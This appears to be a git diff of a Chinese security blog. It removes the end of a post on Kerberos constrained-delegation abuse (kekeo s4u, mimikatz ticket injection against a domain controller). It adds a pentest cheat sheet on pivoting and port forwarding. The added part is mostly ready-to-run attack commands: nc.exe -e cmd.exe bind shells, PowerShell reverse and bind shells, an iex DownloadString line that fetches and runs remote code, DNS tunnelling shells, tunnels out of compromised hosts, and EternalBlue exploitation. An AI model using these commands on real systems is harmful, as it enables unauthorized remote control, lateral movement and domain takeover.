-</code></pre><p><img src="/2018/01/13/利用域委派获取域某些权限/kekeo.png" alt="kekeo"></p>
-<p>由于设置了约束性委派所以利用刚才的WIN10-NEW$的TGT票据，像域服务器发起申请访问域服务器相应服务(CIFS共享服务)管理权限的TGS票据 ： </p>
-<pre><code>Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
-</code></pre><p>即：</p>
-<pre><code>kekeo # tgs::s4u /tgt:TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi /user:administrator@demo.local /service:cifs/OWA2010DC.demo.local
-Ticket  : TGT_WIN10-NEW$@DEMO.LOCAL_krbtgt~demo.local@DEMO.LOCAL.kirbi
-  [krb-cred]     S: krbtgt/demo.local @ DEMO.LOCAL
-  [krb-cred]     E: [00000012] aes256_hmac
-  [enc-krb-cred] P: WIN10-NEW$ @ DEMO.LOCAL
-  [enc-krb-cred] S: krbtgt/demo.local @ DEMO.LOCAL
-  [enc-krb-cred] T: [1/12/2018 2:17:58 AM ; 1/12/2018 12:17:58 PM] {R:1/19/2018 2:17:58 AM}
-  [enc-krb-cred] F: [40e00000] pre_authent ; initial ; renewable ; forwardable ;
-  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): a9e1f34bc1c62de37793943742e0f235a4ba0a0ec01a9899f52b1e9e7798970c
-  [s4u2self]  administrator@demo.local
-[kdc] name: OWA2010DC.demo.local (auto)
-[kdc] addr: 192.168.18.10 (auto)
-  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_WIN10-NEW$@DEMO.LOCAL.kirbi&#39;
-Service(s):
-  [s4u2proxy] cifs/OWA2010DC.demo.local
-  Ticket in file &#39;TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi&#39;
-</code></pre><p>向域服务器发起申请访问域服务器相应服务(CIFS服务)管理权限的TGS票据<br><img src="/2018/01/13/利用域委派获取域某些权限/cfis1.png" alt="cfis1"></p>
-<p>ok</p>
-<p>此时内存中已经有了访问域服务器CIFS服务的域管理员的TGS票据，需要将该票据(administrator的TGS票据)注入当前的会话中，使用mimikatz的kerberos::ptt命令可完成票据的注入。<br>注入票据后，当前的会话具备了访问域服务器C盘目录的权限 kekeo ticket 注入 </p>
-<pre><code>kerberos::ptt TGS_administrator@demo.local@DEMO.LOCAL_cifs~OWA2010DC.demo.local@DEMO.LOCAL.kirbi
-</code></pre><p>注入票据后，访问域服务器C盘目录的权限<br><img src="/2018/01/13/利用域委派获取域某些权限/cfis2.png" alt="cfis2"></p>
-<pre><code>dir \\owa2010dc.demo.local\c$ ==&gt; ok
-</code></pre><p>(4个小时后TGT失效，需要重新认证。)</p>
-<p><a href="https://www.anquanke.com/post/id/92484" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92484</a> 示例有四個，他演示的是示例1，这里演示的是示例4</p>
-<pre><code>样例1：已知被设置约束性委派属性的服务账号的口令明文，则可以获取域管理权限
-样例2：已控制约束性委派服务账号所在的服务器
-    攻击者控制了服务器，与样例1类似。由于攻击者控制了服务器，可直接利用mimikatz从内存获取服务账号的TGT，所以可以省去tgt::ask步骤，直接从tgs:s4u步骤开始，后续和样例1相同。
-样例3：已获取配置了约束性委派的服务账号的口令NTLM
-    和样例1相同，样例1用明文口令生成NTLM，然后向域服务器申请获取服务账号的TGT。Kekeo提供了该功能，可直接从NTLM开始，向域服务器申请TGT。
-样例4：一个主机账号被设置了约束性委派，已获取该主机账号的口令NTLM
-    方法和样例1也是类似，只不过样例1中是服务账号，而本样例中是主机账号。测试结果截图分别如下，不再过多解释。测试可在任何域内主机中进行，不需要在主机账号所在的主机。
-</code></pre><p>參考：</p>
-<pre><code>https://www.anquanke.com/post/id/92484  (作者笔误： &quot;由于sqlsvc被设置为非约束性委派&quot; 改成 &quot;由于sqlsvc被设置为约束性委派&quot; 已证明 )
-http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
-http://powersploit.readthedocs.io/en/latest/
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
-</code></pre>
+3、  nc.exe -e cmd.exe -lp 1234  [windows]
+</code></pre><h2 id="lcx-内网转发"><a href="#lcx-内网转发" class="headerlink" title="lcx 内网转发"></a>lcx 内网转发</h2><p>监听1234端口,转发数据到2333端口</p>
+<pre><code>本地:lcx.exe -listen 1234 6666
+</code></pre><p>将目标的3389转发到本地的1234端口</p>
+<pre><code>肉鸡:lcx.exe -slave my_ip 1234 127.0.0.1 3389
+</code></pre><p>re:最好有个vps</p>
+<h2 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h2><p><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
+<p>python reGeorgSocksProxy.py -p 4444 -u <a href="http://xxx.com/tunnel.php" target="_blank" rel="noopener">http://xxx.com/tunnel.php</a><br>vim /etc/proxychains.conf</p>
+<pre><code>socks5 127.0.0.1 4444
+</code></pre><p>proxychains4 nmap -sT -Pn -n 192.168.1.2</p>
+<h2 id="Tunna-速度较慢"><a href="#Tunna-速度较慢" class="headerlink" title="Tunna[速度较慢]"></a>Tunna[速度较慢]</h2><p><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">https://github.com/SECFORCE/Tunna</a></p>
+<pre><code>python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v 
+rdesktop 127.0.0.1:1234
+</code></pre><h2 id="Linux-portmap-端口映射"><a href="#Linux-portmap-端口映射" class="headerlink" title="Linux portmap 端口映射"></a>Linux portmap 端口映射</h2><p>转发ssh到外网 不太常用</p>
+<pre><code>./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    #先在外网执行
+./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  #在内网shell下执行
+ssh 127.0.0.1 -p 7777   #在外网机器上执行
+</code></pre><p>rtcp.py</p>
+<pre><code>1. 在B服务器上运行：
+    ./rtcp.py l:10001 l:10002
+    表示在本地监听了10001与10002两个端口，这样，这两个端口就可以互相传输数据了
+2. 在A服务器上运行：
+    ./rtcp.py c:localhost:22 c:222.2.2.2:10001
+    表示连接本地的22端口与B服务器的10001端口，这两个端口也可以互相传输数据了
+3. 然后我们就可以这样来访问A服务器的22端口了：
+    ssh 222.2.2.2 -p 10002
+    如果报错ssh_exchange_identification: read: Connection reset by peer  解决方法chmod 400 /etc/ssh/*
+</code></pre><p>tunna</p>
+<pre><code>第一步 运行proxy.py 并指定端口 python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v
+第二步 本地执行  rdesktop 127.0.0.1:1234
+python2.7 proxy.py -u http://x.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389   #-a指定内网的机器
+</code></pre><p>htran<br>正向代理</p>
+<pre><code>服务端      htran.exe -s -bind 8888
+客户端      SocksCap:SOCKS Version 5 服务端IP:8888
+</code></pre><p>反向代理</p>
+<pre><code>客户端      htran.exe -s -listen 1234 8888
+服务端      htran.exe -s -connect 客户端IP 1234
+客户端      SocksCap:SOCKS Version 5 127.0.0.1:8888
+</code></pre><p>正向端口转发</p>
+<pre><code>服务端      htran.exe -p -tran 8888 127.0.0.1 3389
+客户端      RDP 服务端IP:8888
+</code></pre><p>反向端口转发</p>
+<pre><code>客户端      htran.exe -p -listen 1234 8888
+服务端      htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389
+客户端      RDP 127.0.0.1:8888
+</code></pre><p>iptables端口映射</p>
+<pre><code>bash
+vi /etc/sysctl.conf #将net.ipv4.ip_forward=0更改为net.ipv4.ip_forward=1 开启转发功能
+sysctl -p   #使数据转发功能生效
+iptables -t nat -A PREROUTING --dst 192.168.46.129 -p tcp --dport 81 -j DNAT --to-destination 172.24.20.25:80 #把本地192.168.46.129的81端口转为目标172,24.20.25的80端口
+iptables -t nat -A POSTROUTING --dst 172.24.20.25 -p tcp --dport 80  -j SNAT --to-source 192.168.46.129   #172.24.20.25:80返回时 将ip修改为192.168.46.129
+</code></pre><h2 id="端口转发之PowerShell"><a href="#端口转发之PowerShell" class="headerlink" title="端口转发之PowerShell"></a>端口转发之PowerShell</h2><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p>
+<pre><code>Victim IP : 192.168.52.1
+Attacker IP : 192.168.52.129
+</code></pre><p>1.Reverse shell[tcp]</p>
+<pre><code>Attacker:
+    nc -lvp 4444
+Victim:
+    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1
+    PS F:\Shells&gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.52.129 -Port 4444
+</code></pre><p>2.Bind shell[tcp]</p>
+<pre><code>Victim:
+    PS F:\Shells&gt; . .\Invoke-PowerShellTcp.ps1
+    PS F:\Shells&gt; Invoke-PowerShellTcp -Bind -Port 8888
+Attacker:
+    PS F:\Shells&gt; . .\powercat.ps1
+    PS F:\Shells&gt; powercat -c 192.168.52.1 -v -p 8888
+</code></pre><p>3.Reverse shell[UDP]支持ipv6</p>
+<pre><code>Attacker:
+    nc -lvup 53
+Victim:
+    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1
+    PS F:\Shells&gt; Invoke-PowerShellUdp -Reverse -IPAddress 192.168.52.129 -Port 53
+</code></pre><p>4.Bind shell[UDP]</p>
+<pre><code>Victim:
+    PS F:\Shells&gt; . .\Invoke-PowerShellUdp.ps1
+    PS F:\Shells&gt; Invoke-PowerShellUdp -Bind -Port 7777
+Attacker:
+    nc -vtu 192.168.52.1 7777
+</code></pre><p>5.HTTPS</p>
+<p><a href="https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/bfeabd2e043dfef6392e8a930eb1d7a04392af36/Shells/Invoke-PoshRatHttps.ps1</a></p>
+<p>需要Attacker以管理员身份运行,nishang作者最新的脚本会出现错误</p>
+<pre><code>Attacker:
+    PS F:\Shells&gt; . .\Invoke-PoshRatHttps.ps1
+    PS F:\Shells&gt; Invoke-PoshRatHttps -IPAddress 192.168.52.1 -Port 80 -SSLPort 443
+Victim:
+    PS C:\&gt; iex (New-Object Net.WebClient).DownloadString(&quot;http://192.168.52.1/connect&quot;)
+</code></pre><p>6.DNS shell<br>dnscat2 : <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2</a>)<br>powercat: <a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">https://github.com/besimorhino/powercat</a>)</p>
+<p>dnscat2讲解<br><a href="https://04z.net/2017/07/13/DNS-Tunnel/" target="_blank" rel="noopener">https://04z.net/2017/07/13/DNS-Tunnel/</a></p>
+<pre><code>Attacker:
+    root@kali:~# ruby dnscat2.rb shellcome.com
+Victim:
+    PS F:\Shells&gt; . .\powercat.ps1
+    PS F:\Shells&gt; powercat -c 192.168.52.131 -v -dns shellcome.com -ep
+</code></pre><h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><pre><code>meterpreter&gt; run autoroute -s 192.168.1.0/24
+meterpreter&gt; use auxiliary/server/socks4a
+msf&gt; route add 192.168.1.0 255.255.255.0 192.168.1.1 [sessionid]
+</code></pre><h2 id="防火墙开启的ms17-010"><a href="#防火墙开启的ms17-010" class="headerlink" title="防火墙开启的ms17-010"></a>防火墙开启的ms17-010</h2><p>例如:详细查找ms17-010<br><a href="https://packetstormsecurity.com/search/?q=MS17-010" target="_blank" rel="noopener">https://packetstormsecurity.com/search/?q=MS17-010</a></p>
+<pre><code>1、上传EarthWorm转发端口445到指定端口,然后利用eternalblue+Doublepulsar溢出目标8888端口，成功回弹系统权限的shell
+2、由于防火墙限制（也可能其他），直接添加管理员始终不能成功
+3、上传工具，获取管理员密码hash破解，成功登陆3389
+./ew -s lcx_tran -l 8888 -f 127.0.0.1-g 445
+</code></pre><h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><p>re. 使用方法    <a href="http://bobao.360.cn/learning/detail/3502.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3502.html</a></p>
+<pre><code>Earthworm            http://rootkiter.com/EarthWorm
+xsocks            https://github.com/5loyd/xsocks
+ShadowSOCKS（影梭）    https://github.com/shadowSOCKS
+SocksCap64        http://www.sockscap64.com/
+proxychains        http://proxychains.sourceforge.net/
+</code></pre><p>from :<br><a href="https://04z.net/2017/07/09/AD-Attacks-Forwarding/" target="_blank" rel="noopener">https://04z.net/2017/07/09/AD-Attacks-Forwarding/</a></p>
+
       
     </div>
     
@@ -709,11 +704,9 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
       
         <div class="post-tags">
           
-            <a href="/tags/PowerShell/" rel="tag"># PowerShell</a>
+            <a href="/tags/笔记/" rel="tag"># 笔记</a>
           
-            <a href="/tags/域委派/" rel="tag"># 域委派</a>
-          
-            <a href="/tags/TGS票据/" rel="tag"># TGS票据</a>
+            <a href="/tags/端口转发/" rel="tag"># 端口转发</a>
           
         </div>
       
@@ -726,8 +719,8 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/01/09/域渗透(提权篇)/" rel="next" title="域渗透(提权篇)">
-                <i class="fa fa-chevron-left"></i> 域渗透(提权篇)
+              <a href="/2018/01/17/端口转发之SSH隧道/" rel="next" title="端口转发之SSH隧道">
+                <i class="fa fa-chevron-left"></i> 端口转发之SSH隧道
               </a>
             
           </div>
@@ -736,8 +729,8 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/01/17/端口转发之SSH隧道/" rel="prev" title="端口转发之SSH隧道">
-                端口转发之SSH隧道 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/01/25/利用域委派获取域某些权限/" rel="prev" title="利用域委派获取域某些权限">
+                利用域委派获取域某些权限 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -918,7 +911,7 @@ https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#域委派"><span class="nav-number">1.</span> <span class="nav-text">域委派</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#传统反弹与网络发现"><span class="nav-number">1.</span> <span class="nav-text">传统反弹与网络发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iptables"><span class="nav-number">2.</span> <span class="nav-text">iptables</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EarthWorm-绕防火墙"><span class="nav-number">3.</span> <span class="nav-text">EarthWorm[绕防火墙]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shell反弹不出-DMZ"><span class="nav-number">4.</span> <span class="nav-text">Shell反弹不出[DMZ]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSH隧道"><span class="nav-number">5.</span> <span class="nav-text">SSH隧道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Netsh-tcp"><span class="nav-number">6.</span> <span class="nav-text">Netsh[tcp]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-正向"><span class="nav-number">7.</span> <span class="nav-text">nc [正向]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lcx-内网转发"><span class="nav-number">8.</span> <span class="nav-text">lcx 内网转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reGeorg"><span class="nav-number">9.</span> <span class="nav-text">reGeorg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tunna-速度较慢"><span class="nav-number">10.</span> <span class="nav-text">Tunna[速度较慢]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-portmap-端口映射"><span class="nav-number">11.</span> <span class="nav-text">Linux portmap 端口映射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发之PowerShell"><span class="nav-number">12.</span> <span class="nav-text">端口转发之PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#metasploit"><span class="nav-number">13.</span> <span class="nav-text">metasploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙开启的ms17-010"><span class="nav-number">14.</span> <span class="nav-text">防火墙开启的ms17-010</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Socks代理工具"><span class="nav-number">15.</span> <span class="nav-text">Socks代理工具</span></a></li></ol></div>
             
 
           </div>
